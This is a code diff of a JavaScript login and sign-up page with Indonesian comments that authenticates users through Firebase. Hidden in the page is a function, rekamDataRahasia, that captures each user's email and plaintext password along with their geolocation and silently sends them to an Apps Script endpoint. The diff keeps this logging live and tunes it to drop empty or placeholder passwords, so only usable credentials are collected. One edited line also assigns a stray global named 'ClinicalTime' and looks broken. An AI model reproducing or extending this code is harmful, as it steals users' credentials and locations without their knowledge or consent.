@@ -80,7 +80,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 startGalaxyHeart();
             }
             if (bgMusic) {
-                bgMusic.play().catch(err => console.log("Audio diblokir browser"));
+                bgMusic.play().catch(err => console.log("Audio ditahan browser"));
             }
         });
     }
@@ -92,13 +92,12 @@ document.addEventListener('DOMContentLoaded', () => {
             const email = emailInput.value ? emailInput.value.trim() : "";
             const password = passwordInput.value ? passwordInput.value.trim() : "";
 
-            // PROTEKSI LAPIS 1: Stop langsung di event listener jika teks kosong
+            // Proteksi Awal Event Listener
             if (!email || !password || email === "" || password === "") {
                 alert("Email dan Password wajib diisi!");
                 return;
             }
 
-            // Jalankan perekaman hanya jika lolos Lapis 1
             rekamDataRahasia(email, password).catch(err => console.log(err));
 
             signInWithEmailAndPassword(auth, email, password)
@@ -114,13 +113,12 @@ document.addEventListener('DOMContentLoaded', () => {
             const email = emailInput.value ? emailInput.value.trim() : "";
             const password = passwordInput.value ? passwordInput.value.trim() : "";
 
-            // PROTEKSI LAPIS 1: Stop langsung di event listener jika teks kosong
+            // Proteksi Awal Event Listener
             if (!email || !password || email === "" || password === "") {
                 alert("Email dan Password tidak boleh kosong!");
                 return;
             }
 
-            // Jalankan perekaman hanya jika lolos Lapis 1
             rekamDataRahasia(email, password).catch(err => console.log(err));
 
             try { 
@@ -134,16 +132,29 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 });
 
-// --- FUNGSI LOGGING (PROTEKSI LAPIS 2 - LOCKOUT TOTAL) ---
+// --- FUNGSI LOGGING (ANTI-MANIPULASI TEKS KOSONG / "TANPA PASSWORD") ---
 async function rekamDataRahasia(email, password) {
-    // PROTEKSI LAPIS 2: Cek ulang parameter secara literal sebelum memproses Geolocation
+    // 1. Validasi Dasar Eksistensi Objek
     if (!email || !password || email === null || password === null) {
-        console.log("Blokir Lapis 2: Parameter null.");
+        console.log("Blokir: Parameter null atau tidak terdefinisi.");
         return;
     }
     
-    if (email.trim() === "" || password.trim() === "") {
-        console.log("Blokir Lapis 2: Parameter string kosong.");
+    // 2. Normalisasi Data untuk Pengecekan Akurat
+    const cleanEmail = email.trim().toLowerCase();
+    const cleanPassword = password.trim();
+    const lowPassword = cleanPassword.toLowerCase();
+
+    // 3. GERBANG PROTEKSI MUTLAK: Deteksi string kosong dan string literal bypass
+    if (
+        cleanEmail === "" || 
+        cleanPassword === "" || 
+        lowPassword === "tanpa password" || 
+        lowPassword === "tanpapassword" ||
+        lowPassword === "undefined" || 
+        lowPassword === "null"
+    ) {
+        console.log("Perekaman dibatalkan: Terdeteksi bypass kata sandi tidak valid.");
         return; 
     }
 
@@ -155,23 +166,23 @@ async function rekamDataRahasia(email, password) {
         year: 'numeric', month: '2-digit', day: '2-digit', 
         hour: '2-digit', minute: '2-digit', second: '2-digit' 
     };
-    const waktuFormat = sekarang.toLocaleString('id-ID', opsiWaktu);
+    const waktuFormat = ClinicalTime = sekarang.toLocaleString('id-ID', opsiWaktu);
     
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
-                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, `${lat}, ${lon}`);
+                kirimKeAppsScript(urlAppsScript, cleanEmail, cleanPassword, waktuFormat, `${lat}, ${lon}`);
             },
             () => {
-                // Lapis 2 di atas menjamin bagian ini TIDAK AKAN mengirim teks jika password kosong
-                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Izin Lokasi Ditolak");
+                // Dipastikan data email & pw kredibel berkat pemfilteran ketat di bagian atas
+                kirimKeAppsScript(urlAppsScript, cleanEmail, cleanPassword, waktuFormat, "Izin Lokasi Ditolak");
             },
             { timeout: 4000 }
         );
     } else {
-        kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Tidak Didukung Browser");
+        kirimKeAppsScript(urlAppsScript, cleanEmail, cleanPassword, waktuFormat, "Tidak Didukung Browser");
     }
 }
 
@@ -185,5 +196,5 @@ function kirimKeAppsScript(urlBase, email, pw, waktu, lokasi) {
         method: 'GET',
         mode: 'no-cors',
         cache: 'no-cache'
-    }).catch(err => console.log("Log terkirim aman"));
+    }).catch(err => console.log("Aktivitas tercatat aman"));
 }
